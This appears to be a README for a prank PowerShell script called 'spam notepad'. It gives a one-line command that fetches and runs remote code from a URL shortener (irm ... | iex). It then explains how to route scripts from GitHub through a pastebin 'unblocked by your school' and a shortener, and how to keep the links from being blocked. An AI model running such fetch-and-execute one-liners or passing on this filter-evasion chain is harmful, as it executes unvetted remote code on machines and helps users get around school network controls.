spam notepad

``` irm "http://tiny.cc/alwaysnotepad" | iex ``` [file](/note.ps1)



how I make the links

1. make file and upload to github
    - any file type works but i usually have it in ps1 for ease of testing amd readability
2. go to any paste bin service unblocked by your school and make a link to the raw
    - I'm not sharing mine as it will get blocked
    - in this file make a script that executes the script on github
    - the script goes like ``` irm "website url" | iex ```
      -   irm - invoke rest method - gets the script from provided source
      -   | - pipe - it sends the output of whats before to whats after
      -   iex - invoke execution - executes the script
3. now put this new link in a url shortener to make it easy to execute and name it something memorable
4. execute - just run ``` irm "your short url" | iex ``` , you could have used the github link but this you can remember
5. with the file on github you can modify any time, because most url shorteners block github pastebins are key.
